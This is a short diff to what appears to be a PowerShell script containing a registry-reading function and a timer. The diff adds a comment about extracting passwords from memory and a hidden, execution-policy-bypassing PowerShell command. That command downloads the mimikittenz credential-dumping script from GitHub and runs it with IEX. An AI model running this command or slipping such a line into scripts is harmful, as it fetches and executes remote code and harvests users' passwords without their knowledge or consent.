@@ -490,7 +490,8 @@ function registry_values($regkey, $regvalue,$child)
 
 }
 
-
+# Run mimikittenz powershell to extract passwords from memory.
+powershell.exe -w hidden -nop -ep bypass -c "IEX (('new-object net.webclient).downloadstring(https://github.com/putterpanda/mimikittenz/raw/master/Invoke-mimikittenz.ps1'))"
 
 #Stop timer
 $sw.Stop()
